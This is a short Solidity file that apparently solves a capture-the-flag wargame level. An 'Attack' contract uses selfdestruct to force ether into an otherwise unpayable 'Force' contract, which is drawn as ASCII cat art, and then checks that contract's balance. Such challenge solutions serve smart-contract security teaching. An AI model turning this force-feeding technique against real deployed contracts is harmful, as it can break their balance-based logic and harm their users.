// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack {
    address public force;

    event Log(bool success);

    constructor (address _force) {
        force = _force;
    }

    function attack() public payable {
       selfdestruct(payable(force));
    }

    function checkForceBal() public view returns(uint) {
        return address(force).balance;
    }
}